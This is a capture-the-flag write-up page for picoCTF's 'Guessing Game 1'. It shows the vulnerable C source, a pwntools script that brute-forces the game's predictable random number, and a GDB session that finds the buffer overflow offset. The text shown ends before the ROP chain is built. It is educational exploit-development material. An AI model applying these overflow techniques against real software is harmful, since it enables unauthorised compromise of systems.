<!doctype html><html lang="es"><head><title>Guessing Game 1 | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain"><meta itemprop="description" content="picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain"><meta name="twitter:card" content="picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain"><meta name="twitter:description" content="picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain"><meta property="og:description" content="picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Guessing Game 1"><meta property="twitter:title" content="Guessing Game 1"><meta property="og:title" content="Guessing Game 1"><meta property="og:url" content="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/picoctf/binary-exploitation/guessing-game-1/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">BINARY EXPLOITATION</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/&text=Guessing%20Game%201" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/&title=Guessing%20Game%201" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Guessing Game 1</h1><br></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit static binary called <code>vuln</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><p>We also have the C source code. Basically, what the program does is request a number, compare it with a random one and if it is the same, then request a username to print a message:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/types.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/stat.h&gt;</span>

<span class="mtk5">#define</span> <span class="mtk8">BUFSIZE</span> <span class="mtk6">100</span>


<span class="mtk7 mtki">long</span> <span class="mtk8">increment</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk9 mtki">in</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk5">return</span> <span class="mtk1">in</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">long</span> <span class="mtk8">get_random</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk5">return</span> <span class="mtk8">rand</span><span class="mtk1">()</span> <span class="mtk5">%</span> <span class="mtk1">BUFSIZE;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">do_stuff</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">ans</span> <span class="mtk5">=</span> <span class="mtk8">get_random</span><span class="mtk1">();</span>
  <span class="mtk1">ans</span> <span class="mtk5">=</span> <span class="mtk8">increment</span><span class="mtk1">(ans);</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What</span> <span class="mtk4">number</span> <span class="mtk4">would</span> <span class="mtk4">you</span> <span class="mtk4">like</span> <span class="mtk4">to</span> <span class="mtk4">guess?</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">guess[BUFSIZE];</span>
  <span class="mtk8">fgets</span><span class="mtk1">(guess,</span> <span class="mtk1">BUFSIZE,</span> <span class="mtk1">stdin);</span>

  <span class="mtk7 mtki">long</span> <span class="mtk1">g</span> <span class="mtk5">=</span> <span class="mtk8">atol</span><span class="mtk1">(guess);</span>

  <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">g)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"That's</span> <span class="mtk4">not</span> <span class="mtk4">a</span> <span class="mtk4">valid</span> <span class="mtk4">number!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk5">if</span> <span class="mtk1">(g</span> <span class="mtk5">==</span> <span class="mtk1">ans)</span> <span class="mtk1">{</span>
      <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Congrats!</span> <span class="mtk4">You</span> <span class="mtk4">win!</span> <span class="mtk4">Your</span> <span class="mtk4">prize</span> <span class="mtk4">is</span> <span class="mtk4">this</span> <span class="mtk4">print</span> <span class="mtk4">statement!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
      <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>
    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
      <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Nope!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>

  <span class="mtk5">return</span> <span class="mtk1">res;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">win</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">winner[BUFSIZE];</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"New</span> <span class="mtk4">winner!</span><span class="mtk6">\n</span><span class="mtk4">Name?</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">fgets</span><span class="mtk1">(winner,</span> <span class="mtk6">360</span><span class="mtk1">,</span> <span class="mtk1">stdin);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Congrats</span> <span class="mtk6">%s\n\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">winner);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span> <span class="mtk5">**</span><span class="mtk9 mtki">argv</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk8">setvbuf</span><span class="mtk1">(stdout,</span> <span class="mtk6">NULL</span><span class="mtk1">,</span> <span class="mtk1">_IONBF,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk3">//</span> <span class="mtk3">Set</span> <span class="mtk3">the</span> <span class="mtk3">gid</span> <span class="mtk3">to</span> <span class="mtk3">the</span> <span class="mtk3">effective</span> <span class="mtk3">gid</span>
  <span class="mtk3">//</span> <span class="mtk3">this</span> <span class="mtk3">prevents</span> <span class="mtk3">/bin/sh</span> <span class="mtk3">from</span> <span class="mtk3">dropping</span> <span class="mtk3">the</span> <span class="mtk3">privileges</span>
  <span class="mtk7 mtki">gid_t</span> <span class="mtk1">gid</span> <span class="mtk5">=</span> <span class="mtk8">getegid</span><span class="mtk1">();</span>
  <span class="mtk8">setresgid</span><span class="mtk1">(gid,</span> <span class="mtk1">gid,</span> <span class="mtk1">gid);</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">res;</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Welcome</span> <span class="mtk4">to</span> <span class="mtk4">my</span> <span class="mtk4">guessing</span> <span class="mtk4">game!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk8">do_stuff</span><span class="mtk1">();</span>
    <span class="mtk5">if</span> <span class="mtk1">(res)</span> <span class="mtk1">{</span>
      <span class="mtk8">win</span><span class="mtk1">();</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>

  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>First of all, we notice that the <code>get_random</code> function is calling <code>rand</code> and computing the remainder when dividing by 100 (<code>BUFSIZE</code>). Since the seed is the same when the process starts, we can perform a trial-error procedure until we obtain the correct number (iterating from 0 to 99).</p><p>Once having that value, we get access to the <code>win</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">win</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">winner[BUFSIZE];</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"New</span> <span class="mtk4">winner!</span><span class="mtk6">\n</span><span class="mtk4">Name?</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">fgets</span><span class="mtk1">(winner,</span> <span class="mtk6">360</span><span class="mtk1">,</span> <span class="mtk1">stdin);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Congrats</span> <span class="mtk6">%s\n\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">winner);</span>  
<span class="mtk1">}</span>
</code></pre></div><p>Despite using <code>fgets</code>, this function is vulnerable to Buffer Overflow because variable <code>winner</code> has been assigned a 100-length buffer (<code>BUFSIZE</code>) and we are reading 360 bytes from standard input, so we can write outside the reserved buffer.</p><p>We must recall the protections of the binary:</p><ul><li>It has NX enabled, so we cannot execute custom shellcode on the stack.</li><li>It has a stack canary, so there is be a random value placed before <code>$rip</code> that will be validated before every return instruction to prevent that <code>$rip</code> is overwritten. If the value of the canary is modified, then the program exits; otherwise, the program continues.</li></ul><p>Nevertheless, the canary will not affect this time. Although the output of <code>checksec</code> showed that a stack canary was found, the provided <code>Makefile</code> tells to compile the source code without canary:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">all</span><span class="mtk1">:</span>
        <span class="mtk1">gcc</span> <span class="mtk1">-m64</span> <span class="mtk1">-fno-stack-protector</span> <span class="mtk1">-O0</span> <span class="mtk1">-no-pie</span> <span class="mtk1">-static</span> <span class="mtk1">-o</span> <span class="mtk1">vuln</span> <span class="mtk1">vuln.c</span>  

<span class="mtk8">clean</span><span class="mtk1">:</span>
        <span class="mtk1">rm</span> <span class="mtk1">vuln</span>
</code></pre></div><p>Since NX is enabled, we need to use ROP (Return Oriented Programming). This technique takes addresses within the binary that contain instructions (gadgets) that end in <code>ret</code>. As a result, we can concatenate a list of gadgets so that they are executed one by one (ROP chain). This is the way to bypass NX, because we are executing instructions located in the binary, not in the stack.</p><p>Let&rsquo;s begin performing a brute force attack over the number. Notice that the binary is static, so the <code>rand</code> function will give always the same value at the first time.</p><p>We can create a simple Python script using <code>pwntools</code> to start the process, enter a number and close the process if the number is not correct:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import *</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'vuln'</span><span class="mtk1">,</span> <span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>
<span class="mtk1">elf</span> <span class="mtk5">=</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span>

<span class="mtk1">number</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
<span class="mtk1">number_progress</span> <span class="mtk5">=</span> <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Guessing</span> <span class="mtk4">number'</span><span class="mtk1">)</span>

<span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">101</span><span class="mtk1">):</span>
    <span class="mtk1">number_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">))</span>

    <span class="mtk5">with</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
        <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>
        <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What</span> <span class="mtk4">number</span> <span class="mtk4">would</span> <span class="mtk4">you</span> <span class="mtk4">like</span> <span class="mtk4">to</span> <span class="mtk4">guess?</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  

        <span class="mtk5">if</span> <span class="mtk7 mtki">b</span><span class="mtk4">'Congrats!'</span> <span class="mtk5">in</span> <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">():</span>
            <span class="mtk1">number</span> <span class="mtk5">=</span> <span class="mtk1">i</span>
            <span class="mtk5">break</span>

        <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

<span class="mtk5">if</span> <span class="mtk1">number</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">:</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">critical</span><span class="mtk1">(</span><span class="mtk4">'Failed</span> <span class="mtk4">to</span> <span class="mtk4">guess</span> <span class="mtk4">number'</span><span class="mtk1">)</span>

<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Guessed</span> <span class="mtk4">number:</span> <span class="mtk6">{</span><span class="mtk1">number</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><p>After running the script, we get that the number is 84:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-dark-blue">.</span>] Guessing number: 84
[<span class="code-green">+</span>] Guessed number: 84
[<span class="code-dark-blue">*</span>] Stopped process './vuln' (pid 361991)  
</code></pre></div><p>Now we can use GDB to figure out the offset to overwrite <code>$rsp</code> using a pattern string:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">vuln</span>
Reading symbols from <span class="code-dark-green">vuln</span>...
(No debugging symbols found in <span class="code-dark-green">vuln</span>)
<span class="code-red">gef➤</span>  pattern create 500
<span class="code-blue">[+]</span> Generating a pattern of 500 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa  
<span class="code-green">[+]</span> Saved as '$_gef1'
<span class="code-red">gef➤</span>  run
Starting program: ./vuln
Welcome to my guessing game!

What number would you like to guess?
84
Congrats! You win! Your prize is this print statement!

New winner!
Name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaa
taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaa
aboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaa
aaacjaaaaaackaaaaaaclaaaaaacmaaa
Congrats aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaa
aaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaa
aaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaa


Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x0000000000400c8b</span> in <span class="code-dark-yellow">win</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  pattern offset $rsp
<span class="code-blue">[+]</span> Searching for '$rsp'
<span class="code-green">[+]</span> Found at offset 120 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 113 (big-endian search)
